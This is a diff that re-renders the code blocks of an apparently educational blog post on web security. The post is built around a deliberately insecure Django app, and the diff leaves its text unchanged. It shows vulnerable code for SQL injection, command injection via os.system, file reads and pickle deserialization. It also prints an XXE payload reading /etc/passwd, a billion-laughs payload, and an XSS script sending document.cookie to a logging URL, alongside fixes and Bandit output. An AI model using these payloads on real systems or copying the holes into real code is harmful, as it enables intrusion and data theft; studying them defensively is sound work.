@@ -62,9 +62,9 @@
 
 <p>To run the application, get it from github and run</p>
 
-<pre><code>cd insecure
+<div class="highlight"><pre><span></span><span class="nb">cd</span> insecure
 python manage.py runserver
-</code></pre>
+</pre></div>
 
 <h2>Injection</h2>
 
@@ -84,15 +84,15 @@ python manage.py runserver
 
 <p>Unsafe query where SQL injection is possible:</p>
 
-<pre><code>user = User.objects.raw(f'SELECT * FROM security_user WHERE id = {user_id}')
-</code></pre>
+<div class="highlight"><pre><span></span><span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;SELECT * FROM security_user WHERE id = </span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</pre></div>
 
 <p>This doesn&rsquo;t use a parameterised query and instead uses whatever an application received from a user as <code>user_id</code>. This can be easily exploited as in the following example.</p>
 
 <p>An unsafe call to return a user with <code>user_id</code> = 1:</p>
 
-<pre><code>http://127.0.0.1:8000/security/unsafe/users/1
-</code></pre>
+<div class="highlight"><pre><span></span>http://127.0.0.1:8000/security/unsafe/users/1
+</pre></div>
 
 <p>You can abuse that interface by adding <code>1 or id = 2</code> to the URL which will return two different users:</p>
 
@@ -108,13 +108,13 @@ python manage.py runserver
 
 <p>In order to prevent SQL injection, one can use parameterised query which doesn&rsquo;t concatenate query and argument strings in Python.</p>
 
-<pre><code>user = User.objects.raw('SELECT * FROM security_user WHERE id = %s', (user_id,))
-</code></pre>
+<div class="highlight"><pre><span></span><span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM security_user WHERE id = </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">user_id</span><span class="p">,))</span>
+</pre></div>
 
 <p>Or use ORM:</p>
 
-<pre><code>user = User.objects.get(id=user_id)
-</code></pre>
+<div class="highlight"><pre><span></span><span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">user_id</span><span class="p">)</span>
+</pre></div>
 
 <h3>Command Injection</h3>
 
@@ -127,10 +127,10 @@ python manage.py runserver
 
 <p>will print Django&rsquo;s <code>manage.py</code> using the following code.</p>
 
-<pre><code>def read_file(request, filename):
-    with open(filename) as f:
-        return HttpResponse(f.read())
-</code></pre>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</pre></div>
 
 <p>It&rsquo;s unsafe and misses validation of what <code>filename</code> can be or which files can be opened.</p>
 
@@ -138,11 +138,11 @@ python manage.py runserver
 
 <p>Consider this example that tries to copy a file using shell&rsquo;s <code>cp</code> command. It passes <code>filename</code> argument directly to be executed by shell using <code>os.system</code>.</p>
 
-<pre><code>def copy_file(request, filename):
-    cmd = f'cp {filename} new_{filename}'
-    os.system(cmd)
-    return HttpResponse(&quot;All good, don't worry about a thing :&gt;&quot;)
-</code></pre>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">copy_file</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;cp </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s1"> new_</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s1">&#39;</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s2">&quot;All good, don&#39;t worry about a thing :&gt;&quot;</span><span class="p">)</span>
+</pre></div>
 
 <p>If something like <code>http://127.0.0.1:8000/security/files/copy/manage.py</code> is executed, then simply a copy of <code>manage.py</code> called <code>new_manage.py</code> will be created. However, due to the fact that anything can be passed as <code>filename</code>, an attacker could pass in additional commands such as:</p>
 
@@ -175,16 +175,16 @@ python manage.py runserver
 
 <p>Ideally, applications store as little sensitive data about users as possible. If the data is required, it should be securely stored (encrypted). Handling sensitive data is tricky and can easily leak e.g. by caching user profiles or logging. For example, consider a user profile:</p>
 
-<pre><code>class User:
-	# ...
-	def __str__(self):
-		Return f’{self.name} {self.email} {self.phone}’
-</code></pre>
+<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">User</span><span class="p">:</span>
+	<span class="c1"># ...</span>
+	<span class="k">def</span> <span class="fm">__str__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="k">return</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s1"> </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">email</span><span class="si">}</span><span class="s1"> </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">phone</span><span class="si">}</span><span class="s1">&#39;</span>
+</pre></div>
 
 <p>At some point, an application might want to log a user action:</p>
 
-<pre><code>logger.info(‘User %s created a record’, user)
-</code></pre>
+<div class="highlight"><pre><span></span><span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;User </span><span class="si">%s</span><span class="s1"> created a record&#39;</span><span class="p">,</span> <span class="n">user</span><span class="p">)</span>
+</pre></div>
 
 <p>which would cause user&rsquo;s name, email, and phone number to be recorded in logs (which could be stored insecurely for a long time). Instead, only something like an ID should be logged.</p>
 
@@ -196,30 +196,30 @@ python manage.py runserver
 
 <p>Example which could allow an attacker to read system file storing sensitive data (<code>/etc/passwd</code>).</p>
 
-<pre><code> &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
-  &lt;!DOCTYPE foo [
-    &lt;!ELEMENT foo ANY &gt;
-    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
-</code></pre>
+<div class="highlight"><pre><span></span> <span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
+  <span class="cp">&lt;!DOCTYPE foo [</span>
+<span class="cp">    &lt;!ELEMENT foo ANY &gt;</span>
+    <span class="cp">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
+</pre></div>
 
 <p>A problem related to XML&rsquo;s entities can also cause a denial of service attack. It can also affect other formats that use references to other objects (like YAML). An attack called &ldquo;billion laughs attack&rdquo;, shown below, exploits XML&rsquo;s entities that expand <code>log9</code> into a large amount of data that could not fit into memory and crash the application. In an example below, <code>lol9</code> will expand into ten <code>lol8</code>s which in turn will expand into ten <code>lol7</code>s and so on.</p>
 
-<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE lolz [
- &lt;!ENTITY lol &quot;lol&quot;&gt;
- &lt;!ELEMENT lolz (#PCDATA)&gt;
- &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
- &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;
- &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
- &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
- &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
- &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
- &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
- &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
- &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
+<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE lolz [</span>
+<span class="cp"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span>
+ <span class="cp">&lt;!ELEMENT lolz (#PCDATA)&gt;</span>
+ <span class="cp">&lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span>
+ <span class="cp">&lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span>
+ <span class="cp">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span>
+ <span class="cp">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span>
+ <span class="cp">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span>
+ <span class="cp">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span>
+ <span class="cp">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span>
+ <span class="cp">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span>
+ <span class="cp">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span>
 ]&gt;
-&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
-</code></pre>
+<span class="nt">&lt;lolz&gt;</span><span class="ni">&amp;lol9;</span><span class="nt">&lt;/lolz&gt;</span>
+</pre></div>
 
 <h2>Broken Access Control</h2>
 
@@ -284,8 +284,8 @@ python manage.py runserver
 
 <p>A more readable version:</p>
 
-<pre><code>&lt;script&gt;new Image().src=&quot;http://127.0.0.1:8000/security/log?string=&quot;.concat(document.cookie)&lt;/script&gt;
-</code></pre>
+<div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="k">new</span> <span class="nx">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="s2">&quot;http://127.0.0.1:8000/security/log?string=&quot;</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</pre></div>
 
 <p>shows that this creates a new image and tries to load it from a URL beginning with <code>http://127.0.0.1:8000/security/</code> and ending with user&rsquo;s cookies. Appropriate Content-Security Policy would have blocked it.</p>
 
@@ -297,24 +297,24 @@ python manage.py runserver
 
 <p>As an example, consider a simple class representing a user:</p>
 
-<pre><code>@dataclass
-class TestUser:
-    perms: int = 0
-</code></pre>
+<div class="highlight"><pre><span></span><span class="nd">@dataclass</span>
+<span class="k">class</span> <span class="nc">TestUser</span><span class="p">:</span>
+    <span class="n">perms</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span>
+</pre></div>
 
 <p>Field <code>perms</code> can be understood as access level a user has, <code>0</code> for ordinary users and <code>1</code> for administrators.</p>
 
 <p>The request handler, presented below, decodes a token encoded using <code>base64</code> and then tries to &ldquo;unpickle&rdquo; it using Python&rsquo;s <code>pickle</code> module from the standard library. The intention is to transfer the data stored in a token into an instance of <code>TestUser</code> class. Then, <code>perms</code> field is checked and different output is shown depending on whether the application thinks it&rsquo;s dealing with an administrator or not.</p>
 
-<pre><code>def admin_index(request):
-    token = base64.b64decode(request.COOKIES.get('silly_token', ''))
-    user = pickle.loads(token)
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">admin_index</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">COOKIES</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;silly_token&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>
+    <span class="n">user</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
 
-    if user.perms == 1:
-        return HttpResponse('Hello Admin')
+    <span class="k">if</span> <span class="n">user</span><span class="o">.</span><span class="n">perms</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s1">&#39;Hello Admin&#39;</span><span class="p">)</span>
 
-    return HttpResponse('No access')
-</code></pre>
+    <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s1">&#39;No access&#39;</span><span class="p">)</span>
+</pre></div>
 
 <p>This is unsafe and can be abused.</p>
 
@@ -365,30 +365,30 @@ class TestUser:
 
 <p>To run it on the example Django application, execute:</p>
 
-<pre><code>bandit -r ./insecure/security
-</code></pre>
+<div class="highlight"><pre><span></span>bandit -r ./insecure/security
+</pre></div>
 
 <p>This will print a number of messages, along with corresponding code. Some of them will be related to concerns mentioned before.</p>
 
 <p>For instance, it warns of a &ldquo;possible SQL injection&rdquo; where it indeed can occur.</p>
 
-<pre><code>&gt;&gt; Issue: [B608:hardcoded_sql_expressions] Possible SQL injection vector through string-based query construction.
-   Severity: Medium   Confidence: Low
-   Location: insecure/security/views.py:13
-   More Info: https://bandit.readthedocs.io/en/latest/plugins/b608_hardcoded_sql_expressions.html
-12	def unsafe_users(request, user_id):
-13	    users = User.objects.raw(f'SELECT * FROM security_user WHERE id = {user_id}')
-</code></pre>
+<div class="highlight"><pre><span></span><span class="o">&gt;&gt;</span> <span class="n">Issue</span><span class="p">:</span> <span class="p">[</span><span class="n">B608</span><span class="p">:</span><span class="n">hardcoded_sql_expressions</span><span class="p">]</span> <span class="n">Possible</span> <span class="n">SQL</span> <span class="n">injection</span> <span class="n">vector</span> <span class="n">through</span> <span class="n">string</span><span class="o">-</span><span class="n">based</span> <span class="n">query</span> <span class="n">construction</span><span class="o">.</span>
+   <span class="n">Severity</span><span class="p">:</span> <span class="n">Medium</span>   <span class="n">Confidence</span><span class="p">:</span> <span class="n">Low</span>
+   <span class="n">Location</span><span class="p">:</span> <span class="n">insecure</span><span class="o">/</span><span class="n">security</span><span class="o">/</span><span class="n">views</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">13</span>
+   <span class="n">More</span> <span class="n">Info</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">bandit</span><span class="o">.</span><span class="n">readthedocs</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">en</span><span class="o">/</span><span class="n">latest</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">b608_hardcoded_sql_expressions</span><span class="o">.</span><span class="n">html</span>
+<span class="mi">12</span>	<span class="k">def</span> <span class="nf">unsafe_users</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">user_id</span><span class="p">):</span>
+<span class="mi">13</span>	    <span class="n">users</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;SELECT * FROM security_user WHERE id = </span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</pre></div>
 
 <p>It also does warn about use of <code>pickle</code> module and how unsafe it can be.</p>
 
-<pre><code>&gt;&gt; Issue: [B301:blacklist] Pickle and modules that wrap it can be unsafe when used to deserialize untrusted data, possible security issue.
-   Severity: Medium   Confidence: High
-   Location: insecure/security/views.py:51
-   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b301-pickle
-50	
-51	    user = pickle.loads(token)
-</code></pre>
+<div class="highlight"><pre><span></span><span class="o">&gt;&gt;</span> <span class="n">Issue</span><span class="p">:</span> <span class="p">[</span><span class="n">B301</span><span class="p">:</span><span class="n">blacklist</span><span class="p">]</span> <span class="n">Pickle</span> <span class="ow">and</span> <span class="n">modules</span> <span class="n">that</span> <span class="n">wrap</span> <span class="n">it</span> <span class="n">can</span> <span class="n">be</span> <span class="n">unsafe</span> <span class="n">when</span> <span class="n">used</span> <span class="n">to</span> <span class="n">deserialize</span> <span class="n">untrusted</span> <span class="n">data</span><span class="p">,</span> <span class="n">possible</span> <span class="n">security</span> <span class="n">issue</span><span class="o">.</span>
+   <span class="n">Severity</span><span class="p">:</span> <span class="n">Medium</span>   <span class="n">Confidence</span><span class="p">:</span> <span class="n">High</span>
+   <span class="n">Location</span><span class="p">:</span> <span class="n">insecure</span><span class="o">/</span><span class="n">security</span><span class="o">/</span><span class="n">views</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">51</span>
+   <span class="n">More</span> <span class="n">Info</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">bandit</span><span class="o">.</span><span class="n">readthedocs</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">en</span><span class="o">/</span><span class="n">latest</span><span class="o">/</span><span class="n">blacklists</span><span class="o">/</span><span class="n">blacklist_calls</span><span class="o">.</span><span class="n">html</span><span class="c1">#b301-pickle</span>
+<span class="mi">50</span>	
+<span class="mi">51</span>	    <span class="n">user</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+</pre></div>
 
 <h2>Summary</h2>
 
